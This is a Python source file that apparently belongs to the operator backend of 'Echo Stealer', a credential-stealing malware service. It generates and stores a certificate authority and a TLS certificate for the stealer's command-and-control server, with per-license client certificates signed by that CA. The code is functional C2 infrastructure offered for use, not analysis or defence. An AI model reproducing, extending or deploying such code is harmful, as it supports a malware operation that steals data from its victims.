"""
Auto-generate and persist the operator CA + server TLS cert on first startup.
All per-license client certs are signed by this CA.
"""
from __future__ import annotations
import datetime
import os

from sqlalchemy.orm import Session

from models.ca import OperatorCA


def get_or_create(db: Session) -> OperatorCA:
    ca = db.get(OperatorCA, 1)
    if ca:
        return ca

    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa

    now = datetime.datetime.now(datetime.timezone.utc)

    ca_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    ca_cert = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Echo Stealer Operator CA")]))
        .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Echo Stealer Operator CA")]))
        .public_key(ca_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=3650))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .add_extension(x509.KeyUsage(
            digital_signature=True, key_cert_sign=True, crl_sign=True,
            content_commitment=False, key_encipherment=False,
            data_encipherment=False, key_agreement=False,
            encipher_only=False, decipher_only=False,
        ), critical=True)
        .sign(ca_key, hashes.SHA256())
    )

    import ipaddress as _ip
    _c2_host = os.environ.get("PHANTOM_C2_HOST", "")
    _san_entries: list = [x509.DNSName("echo-stealer.c2")]
    if _c2_host:
        try:
            _san_entries.append(x509.IPAddress(_ip.ip_address(_c2_host)))
        except ValueError:
            _san_entries.append(x509.DNSName(_c2_host))

    srv_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    srv_cert = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Echo Stealer C2 Server")]))
        .issuer_name(ca_cert.subject)
        .public_key(srv_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=3650))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.SubjectAlternativeName(_san_entries), critical=False)
        .add_extension(x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
        .sign(ca_key, hashes.SHA256())
    )

    def _pem_key(k):
        return k.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        ).decode()

    def _pem_cert(c):
        return c.public_bytes(serialization.Encoding.PEM).decode()

    record = OperatorCA(
        id=1,
        ca_cert_pem=_pem_cert(ca_cert),
        ca_key_pem=_pem_key(ca_key),
        srv_cert_pem=_pem_cert(srv_cert),
        srv_key_pem=_pem_key(srv_key),
    )
    db.add(record)
    db.commit()
    return record
